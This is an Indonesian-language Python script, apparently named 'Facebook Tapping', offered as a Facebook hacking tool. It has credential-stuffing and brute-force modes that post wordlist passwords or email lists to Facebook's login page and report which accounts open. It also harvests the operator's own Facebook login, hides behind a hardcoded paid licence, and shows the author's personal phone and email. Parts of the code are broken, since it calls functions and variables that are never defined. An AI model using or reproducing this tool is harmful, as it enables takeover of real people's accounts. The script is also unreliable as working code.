#!/usr/bin/python

import time
import os
import sys
import getpass

sleep = time.sleep
system = os.system
exit = sys.exit

try:
    import requests
    
except ModuleNotFoundError:
    system("pip install requests")
    
try:
    import mechanize
    
except ModuleNotFoundError:
    system("pip install mechanize")

def katik(k):
    #titik = ['.   ', '. .  ', '. . . ']
    #ang = ['12%', '35%', '50%', '67%', '83%', '94%', '100%']
    
    for o in k + '\n':
        sys.stdout.write(o)
        sys.stdout.flush()
        sleep(0.2)

def slowprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        sleep(2.0 / 90)
        
def lambat(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        sleep(0.2)
        
def awal():
    try:
        main_4()
        
    except KeyboardInterrupt:
        slowprint("\033[1;32m[\033[1;33m!\033[1;32m] \033[1;33mCTRL + C EXIT\033[1;37m")
        
def menentukan():
    a = input("\033[1;33m[\033[1;37m?\033[1;33m]  : \033[1;37m")
        
def buatakun():
    try:
        logo_1()
        print ("")
        slowprint("\033[1;32m[\033[1;33m+\033[1;32m] \033[1;33mMenu : ")
        slowprint("\033[1;32m[\033[1;33m1\033[1;32m] \033[1;33mDaftar")
        slowprint("\033[1;32m[\033[1;33m2\033[1;32m] \033[1;33mMasuk")
        
    except KeyboardInterrupt:
        slowprint("\033[1;32m[\033[1;33m!\033[1;32m] \033[1;33mCTRL + C EXIT\033[1;37m")
        
def main_4():
    sleep(2)
    print ("")
    slowprint("\033Follow Akun github Dark devil")
    slowprint("=> https://github.com/Darkdevil730")
    sleep(3)
    #localtime = time.asctime(time.localtime(time.time))
    system("clear")
    slowprint("\033[1;32m[\033[1;33m!\033[1;32m] Login Facebook Dulu gan :V")
    slowprint("\033[1;32m[\033[1;33m!\033[1;32m] Catatan : Fb lu Sendiri")
    #print ("Time : %s" % localtime)
    print ("")
    uh = input("\033[1;33m[\033[1;37m?\033[1;33m] Masukkan |Email| |ID| |No Hp| : \033[1;37m")
    pr = getpass.getpass("\033[1;33m[\033[1;37m?\033[1;33m] Password : \033[1;37m")
    try:
        sleep(2)
        lambat("\033[1;33m[\033[1;37m*\033[1;33m] Sedang Login .  .  .")
        sleep(2)
        print ("\033[1;33m[\033[1;37m*\033[1;33m] Mohon Tunggu\033[1;37m")
        lambat("> > > > > > > > > > > > > 100%")
        up = 'https://free.facebook.com/login.php'
        asiap = requests.post(up, data={'email':uh, 'pass':pr, 'login':'submit'})
        atta = asiap.content
        if "Beranda" in str(atta):
            slowprint("\033[1;33m[\033[1;37m*\033[1;33m] Login akun Facebook sukses .  .  .\033[1;37m")
            main()
        
        else:
            slowprint("\033[1;33m[\033[1;31m!\033[1;33m] Login akun Facebook gagal .  .  .\033[1;37m")
            exit(1)
            
    except KeyboardInterrupt:
        cepat("\n\033[1;31mCTRL + C : Exit dari Proggram\033[1;37m\n")
        exit(1)
        
    except mechanize.URLError:
        cepat("\033[1;33m[\033[1;37m!\033[1;33m] Koneksi Internet Tidak ada")
        cepat("\033[1;33m[\033[1;37m!\033[1;33m] Nonaktifkan Mode Pesawat")
        cepat("\033[1;33m[\033[1;37m!\033[1;33m] Atau Boot Ulang Jaringan")
        exit(1)
        
def logo_1():
    try:
        sleep(2)
        system("clear")
        sleep(2)
        print ("")
        slowprint("""
        \033[1;32m
         ______                         _______                         
        |  ____|                       |__   __|                        
        | |__      __ _    ___    ___     | |      __ _   _ __    _ __  
        |  __|    / _` |  / __|  / _ \    | |     / _` | | '_ \  | '_ \ 
        | |      | (_| | | (__  |  __/    | |    | (_| | | |_) | | |_) |
        |_|       \__,_|  \___|  \___|    |_|     \__,_| | .__/  | .__/ 
                                                         | |     | |    
                        ( \033[1;33mFacebook Tapping \033[1;32m)             |_|     |_| \033[1;37mV1.2
        """)
        
    except KeyboardInterrupt:
        slowprint("\033[1;32m[\033[1;33m!\033[1;32m] \033[1;33mCTRL + C EXIT\033[1;37m")
        
def main_3():
    sleep(2)
    system("clear")
    sleep(2)
    slowprint("""
        \033[1;32m _____                    _____                      
        |  ___|                   |_   _|                     
        | |_     __ _   ___   ___   | |    __ _  _ __   _ __  
        |  _|   / _` | / __| / _ \  | |   / _` || '_ \ | '_ \ 
        | |    | (_| || (__ |  __/  | |  | (_| || |_) || |_) |
        \_|     \__,_| \___| \___|  \_/   \__,_|| .__/ | .__/ 
                                                | |    | |    
                    \033[1;33m( \033[1;32mFacebook Tapping \033[1;33m)        \033[1;32m|_|    |_| \033[1;37mV1.2
    """)
    slowprint("\033[1;32m[\033[33m*\033[1;32m] \033[1;33mAuthor >> \033[1;37mD@rk_Devil#666")
    slowprint("\033[1;32m[\033[33m*\033[1;32m]   \033[1;33mWA   >> \033[1;37m089652884613")
    slowprint("\033[1;32m[\033[33m*\033[1;32m] \033[1;33mEmail  >> \033[1;37mDarkhytd666@gmail.com")
    print ("")
    link = 'https://free.facebook.com/login.php'
    slowprint("\033[1;32m[\033[1;37m√\033[1;32m] \033[1;33mCTRL + C Untuk Memberhentikan Proggram")
    slowprint("\033[1;32m[\033[1;37m+\033[1;32m] \033[1;33mKategori : \033[1;37mHack Fb Massal")
    print ("")
    word = input("\033[1;33m[\033[1;37m?\033[1;33m] Masukkan Wordlist : \033[1;37m")
    kah = input("\033[1;33m[\033[1;37m?\033[1;33m] Password : \033[1;37m")
    try:
        lambat("\033[1;33m[\033[1;37m√\033[1;33m] Memulai Mengcrack  .  .  .")
        z = open(word, "r").readlines()
        for baris in z:
            pas = baris.strip()
            server = requests.post(link, data={'email':pas, 'pass':kah, 'login':'submit'})
            konten = server.content
        
            if "Beranda" in str(konten):
                print ("\033[1;33m[\033[1;37m√\033[1;33m] Berhasil : \033[1;37m%s" % pas, " \033[1;33m>> \033[1;37m%s" % kah)
            
            elif "checkpoint" in str(konten):
                print ("\033[1;33m[\033[1;37m!\033[1;33m] CheckPoint : \033[1;31m%s" % pas, " \033[1;33m>> \033[1;31m%s" % kah)
            
            else:
                print ("\033[1;33m[\033[1;37m!\033[1;33m] Gagal : \033[1;31m%s" % pas, " \033[1;33m>> \033[1;31m%s" % kah)
                
    except KeyboardInterrupt:
        slowprint("\n\033[1;33m[\033[1;37m!\033[1;33m] CTRL + C : \033[1;31mExit\033[1;37m")
        exit(1)
        
    except IOError:
        print ("\033[1;32m[\033[1;37m!\033[1;32m] File ==> \033[;37m%s \033[1;32m<== tidak ditemukan\n\033[1;37m" % word)
        
    except requests.exceptions.ConnectionError:
        print ("\033[1;33m[\033[1;37m!\033[1;33m] Tidak ada koneksi Internet")
        exit(1)
    
def main_2():
    sleep(2)
    system("clear")
    sleep(2)
    slowprint("""
        \033[1;32m ______                         _                           
        |  ____|                       | |                          
        | |__      __ _    ___    ___  | |_    __ _   _ __    _ __  
        |  __|    / _` |  / __|  / _ \ | __|  / _` | | '_ \  | '_ \ 
        | |      | (_| | | (__  |  __/ | |_  | (_| | | |_) | | |_) |
        |_|       \__,_|  \___|  \___|  \__|  \__,_| | .__/  | .__/ 
                                                     | |     | |    
                        \033[1;33m( \033[1;32mFacebook Tapping \033[1;33m)         \033[1;32m|_|     |_| \033[1;37mV1.2
                            
    """)
    slowprint("\033[1;32m[\033[33m*\033[1;32m] \033[1;33mAuthor >> \033[1;37mD@rk_Devil#666")
    slowprint("\033[1;32m[\033[33m*\033[1;32m]   \033[1;33mWA   >> \033[1;37m089652884613")
    slowprint("\033[1;32m[\033[33m*\033[1;32m] \033[1;33mEmail  >> \033[1;37mDarkhytd666")
    print ("")
    slowprint("\033[1;32m[\033[33m*\033[1;32m] \033[1;33mMenu : ")
    slowprint("\033[1;32m[\033[1;37m1\033[1;32m] \033[1;33mFaceTapp Massal")
    slowprint("\033[1;32m[\033[1;37m2\033[1;32m] \033[1;33mFaceTapp Target")
    slowprint("\033[1;32m[\033[1;37m3\033[1;32m] \033[1;33mFaceTapp Random")
    slowprint("\033[1;32m[\033[1;37m0\033[1;32m] \033[1;33mExit")
    print ("")
    choose = input("\033[1;33m[\033[1;37m?\033[1;33m] Pilih : \033[1;37m")
    masal = '1'
    target = '2'
    keluar = '0'
    if choose == str('1'):
        main_3()
        
    elif choose == str('2'):
        main_1()
        
    elif choose == str('3'):
        facerandom()
        
    elif choose == str('0'):
        exit(2)
        
    else:
        slowprint("\033[1;33m[\033[1;37m!\033[1;33m] Error : Wrong Input")
        main_2()
        
def main():
    try:
        sleep(2)
        print ("")
        #cantik = system
        slowprint("\033[1;31m█\033[1;31m█\033[1;31m█\033[1;33m█\033[1;33m█\033[1;33m█\033[1;32m█\033[1;32m█\033[1;32m█\033[1;37m 100%")
        system("clear")
        slowprint("\033[1;32mMasukkan Username dan Password")
        slowprint("\033[1;32mAtau hubungi Developer, bila")
        slowprint("\033[1;32mIngin mengetahui Username dan")
        slowprint("\033[1;32mPasswordnya")
        slowprint("\033[1;32mKategori : Berbayar")
        slowprint("\033[1;32mNo Author : 089652884613")
        #slowprint("\033[1;32mUser : \033[1;33m%s \033[1;33mbelum memiliki lisensi" % cantik("\nwhoami"))
        kata = 'Farrel'
        kunci = '666'
        use1 = input("\033[1;33m[\033[1;37m?\033[1;33m] Username : \033[1;37m")
        try:
            if use1 == kata:
                kat1 = getpass.getpass("\033[1;33m[\033[1;37m?\033[1;33m] Password : \033[1;37m")
                try:
                    if kat1 == kunci:
                        lambat("\033[1;33m[\033[1;37m√\033[1;33m] Login Sukses .  .  .")
                        #katik()
                        main_2()
            
                    else:
                        lambat("\033[1;33m[\033[1;37m!\033[1;33m] Password \033[1;37m%s \033[1;33msalah" % kat1)
                        sleep(2)
                        system("clear")
                        main()
                        
                except mechanize.URLError:
                    slowprint("tidak ada koneksi internet")
                    
            elif use1 == fes:
                yah = input("\033[1;33m[\033[1;37m?\033[1;33m] Password : \033[1;37m")
                if yah == ter:
                    lambat("\033[1;33m[\033[1;37m√\033[1;33m] Login Sukses .  .  .")
                    main_2()
                    
                else:
                    lambat("\033[1;33m[\033[1;37m!\033[1;33m] Password \033[1;37m%s \033[1;33msalah" % yah)
                    sleep(2)
                    system("clear")
                    main()
                    
            
            else:
                lambat("\033[1;33m[\033[1;37m!\033[1;33m] Username \033[1;37m%s \033[1;33msalah" % use1)
                sleep(2)
                system("clear")
                main()
                
        except requests.exceptions.ConnectionError:
            slowprint("Koneksi Internet Jelek")
            exit(1)
            
        except KeyboardInterrupt:
            slowprint("\033[1;31mExit Dari Proggram")
            exit(1)
            
        except mechanize.URLError:
            slowprint("koneksi internet tidak ada")
            exit(1)
            
    except mechanize.URLError:
        slowprint("\033[1;33m[\033[1;37m!\033[1;33m] Tidak ada koneksi Internet")
        slowprint("\033[1;33m[\033[1;37m!\033[1;33m] Non aktifkan mode pesawat")
        slowprint("\033[1;33m[\033[1;37m!\033[1;33m] Atau boot ulang jaringan")
        exit(1)
    
    except KeyboardInterrupt:
        slowprint("\033[1;31mExit Dari Proggram")
        exit(1)
        
def main_1():
    sleep(2)
    system("clear")
    system("xdg-open https://wa.me/6289652884613/?text=Aku%20mau%20kok%20Jadi%20Pacar%20Kamu%20")
    sleep(2)
    system("clear")
    sleep(2)
    namaku = input("\033[1;33m[\033[1;37m?\033[1;33m] Tuliskan Namamu : \033[1;37m")
    sleep(2)
    system("clear")
    sleep(2)
    slowprint("""
                                                           
     \033[1;32m/**/////                             /**             ****** 
    /**        ******    *****   *****  ******  ******  /**///**
    /*******  //////**  **///** **///**///**/  //////** /**  /**
    /**////    ******* /**  // /*******  /**    ******* /****** 
    /**       **////** /**   **/**////   /**   **////** /**///  
    /**      //********//***** //******  //** //********/**     
    //        ////////  /////   //////    //   //////// //  \033[1;37mV1.2
    
                     \033[1;33m( \033[1;32mFacebook Tapping \033[1;33m)

     \033[33m* \033[1;33mAuthor > \033[1;37mD@rk_Devil#666
       \033[33m* \033[1;33mWA   > \033[1;37m089652884613
      \033[33m* \033[1;33mEmail > \033[1;37mDarkhytd666@gmail.com
     \033[33m* \033[1;32mCopyright © 2019 \033[1;37mFarrel
    """)
    sleep(0.3)
    print ("")
    slowprint("\033[1;32m[\033[33m*\033[1;32m] \033[1;33mSelamat Datang \033[1;37m%s" % namaku)
    sleep(0.3)
    slowprint("\033[1;33m[\033[1;37m+\033[1;33m] Kategori : \033[1;37mHack Fb Target")
    sleep(0.3)
    slowprint("\033[1;33m[\033[1;37m!\033[1;33m] CTRL + C Memberhentikan Proggram")
    sleep(0.3)
    print ("")
    url = 'https://free.facebook.com/login.php'
    email = input("\033[1;33m[\033[1;37m?\033[1;33m] \033[1;32mMasukkan |ID| |Email| |No| : \033[1;37m")
    pw = input("\033[1;33m[\033[1;37m?\033[1;33m] \033[1;32mPassword LIST : \033[1;37m")
    try:
        sleep(2)
        lambat("\033[1;33m[\033[1;37m√\033[1;33m] Memulai Mengcrack \033[1;37m%s .  .  ." % email)
    
        x = open(pw, "r").readlines()
    
        for line in x:
            password = line.strip()
        
            http = requests.post(url, data={'email':email, 'pass':password, 'login':'submit'})
            content = http.content
            if "Beranda" in str(content):
                print ("\033[1;33m[\033[1;37m√\033[1;33m] \033[1;33mPassword ditemukan >> \033[1;37m%s" % password)
                exit(1)
            
            else:
                print ("\033[1;33m[\033[1;37m!\033[1;33m] \033[1;33mGagal >> \033[1;31m%s" % password)
                
    except KeyboardInterrupt:
        slowprint("\033[1;31mCTRL + C : Exit")
        exit(1)
        
    except IOError:
        print("\033[1;32m[\033[1;37m!\033[1;32m] File ==> \033[1;37m%s \033[1;32m<== tidak ditemukan\n\033[1;37m" % pw)
        exit(1)
        
            
if __name__ == "__main__":
    main()
